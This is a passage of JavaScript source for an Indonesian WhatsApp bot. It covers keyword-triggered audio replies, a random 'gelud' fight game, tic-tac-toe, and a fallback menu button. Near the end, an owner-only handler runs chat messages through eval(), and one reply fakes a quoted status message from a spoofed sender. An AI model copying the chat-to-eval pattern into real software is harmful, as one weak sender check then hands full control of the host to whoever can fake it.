enamtujuh = fs.readFileSync('assets/sound67.mp3');
dimas.sendMessage(from, enamtujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound68')) {
enamdelapan = fs.readFileSync('assets/sound68.mp3');
dimas.sendMessage(from, enamdelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound69')) {
enamsembilan = fs.readFileSync('assets/sound69.mp3');
dimas.sendMessage(from, enamsembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound70')) {
tujuhpuluh = fs.readFileSync('assets/sound10.mp3');
dimas.sendMessage(from, tujuhpuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Sound71')) {
tujuhsatu = fs.readFileSync('assets/sound10.mp3');
dimas.sendMessage(from, tujuhsatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}


//////////////////////////////clone///////////////////////////////
if (budy.includes('Pagi')) {
enamlima = fs.readFileSync('assets/ohayo.mp3');
dimas.sendMessage(from, enamlima, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Ohayo')) {
enamenam = fs.readFileSync('assets/ohayo.mp3');
dimas.sendMessage(from, enamenam, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Ohayou')) {
enamtujuh = fs.readFileSync('assets/ohayo.mp3');
dimas.sendMessage(from, enamtujuh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Konichiwa')) {
enamdelapan = fs.readFileSync('assets/konichiwa.mp3');
dimas.sendMessage(from, enamdelapan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Araara')) {
enamsembilan = fs.readFileSync('assets/ara.mp3');
dimas.sendMessage(from, enamsembilan, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('anjay')) {
tujuhpuluh = fs.readFileSync('assets/dasarloanjay.mp3');
dimas.sendMessage(from, tujuhpuluh, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}
if (budy.includes('Anjay')) {
tujuhsatu = fs.readFileSync('assets/dasarloanjay.mp3');
dimas.sendMessage(from, tujuhsatu, MessageType.audio, {quoted: freply, mimetype: 'audio/mp4', ptt:true})
}







if (budy.includes(`assalamualaikum`)) {
                  reply(`Waalaikumsalam`, {quoted:freply})
                  }

		if (budy.includes(`Assalamualaikum`)) {
                  reply(`Waalaikumsalam`)
                  }
                  
                  if (budy.includes(`syalom`)) {
                  reply(`waalaikumsalam`)
                  }
                  
if (budy.includes("Numa")){

		dimas.updatePresence(from, Presence.composing)

		const loli = fs.readFileSync('./assets/numa')

        dimas.sendMessage(from, loli, MessageType.audio, {quoted: dim, mimetype: 'audio/mp4', ptt:true})

        const d = fs.readFileSync('./sticker/jget.webp');

        dimas.sendMessage(from, d, sticker, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "song : dj numa numa yei", 'jpegThumbnail': fs.readFileSync('./sticker/dnsnew.webp')}}}})

        }


if (fs.existsSync(`./media/${from}.json`)) {
	gelutSkuy = setGelud(`${from}`)
	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (gelutSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		gelutSkuy.status = true
		rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
		starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
	   dimas.sendMessage(from, starGame, text, {quoted: dim, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
		fs.unlinkSync("./media/" + from + ".json");
	} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		dimas.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: dim, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./media/" + from + ".json");
	}
}

if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = 
`*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❎
Player2 @${tty.player2.split('@')[0]}=⭕

Giliran = @${tty.player1.split('@')[0]}

   ${angka[1]}${angka[2]}${angka[3]}
   ${angka[4]}${angka[5]}${angka[6]}
   ${angka[7]}${angka[8]}${angka[9]}`
  dimas.sendMessage(from, ucapan, text, {quoted: dim, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
dimas.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:dim,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = 
`*🎳Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
dimas.sendMessage(from, ucapan1, text, {quoted: dim, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri ??👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❎

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
dimas.sendMessage(from, ucapan, text, {quoted: dim, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
dimas.sendMessage(from, ucapan1, text, {quoted:dim, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❎
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
 dimas.sendMessage(from, ucapan, text, {quoted: dim, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
}
if (/^=?>/.test(budy) && (isOwner || dim.key.fromMe)){

let parse = /^=>/.test(budy) ? budy.replace(/^=>/,'return') : budy.replace(/^>/,'')

try{

let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })

return reply(require('util').format(evaluate))

 } catch(e){

 return reply(require('util').format(e))

}
}
 if (isCmd){
//teks = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
//dimas.sendMessage(from, {text:teks, jpegThumbnail:fs.readFileSync('./media/wpmobile.png')}, 'extendedTextMessage', {sendEphemeral:true, quoted:dim, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
 return sendButMessage(from, `Maaf ${pushname}, command ${prefix + command} tidak ada dalam menu`, 'Menunya di baca kakak:v', [
          {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: `MENU`,
            },
            type: 1,
              }], {quoted:freply})
 //if (isr)
}
	} 
if (isGroup && budy != undefined) {
} else {
console.log('[',color('TEXT','teal'),']',`Pesan : ${budy} Dari`, color(pushname))
}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'cyan'))
        }
	}
}



